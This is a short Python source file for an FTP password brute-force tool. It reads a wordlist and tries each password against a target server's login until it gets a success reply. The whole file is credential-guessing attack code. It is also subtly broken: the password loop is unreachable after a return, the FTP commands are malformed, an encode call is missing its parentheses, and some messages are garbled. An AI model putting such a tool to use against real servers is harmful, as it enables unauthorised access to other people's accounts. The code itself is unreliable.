from file import file
from src import clear_src
import socket


def ftp(server):

	clear_src()

	print("[*]Put the password file in the same directory.\n[*]The passwords should be on different lines.\n")
	passwords=file().read_text().splitlines()
	username=input("Enter username:")
	server=socket.gethostbyname(server)
	try:
		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

	except:
		return print("")

	try:
		s.connect((server,21))

	except:
		return print("")

		data=s.recv(1024)

		for password in passwords:
			s.send('USER'.encode()+username.encode()+'\r\n'.encode())
			data=s.recv(1024)
			s.send('pass'.encode()+password.encode+'\r\n'.encode())
			data=s.recv(1024).decode()

			print(data)

			print(""+password+"\n")

			if "230" in data:
				print("password found:")
				return print("passwod is"+password)
			else:
                               print("Done"+password+"password found..........")


	        	
	s.send("Quit \r\n".encode())
	s.close()
	print("End..................")
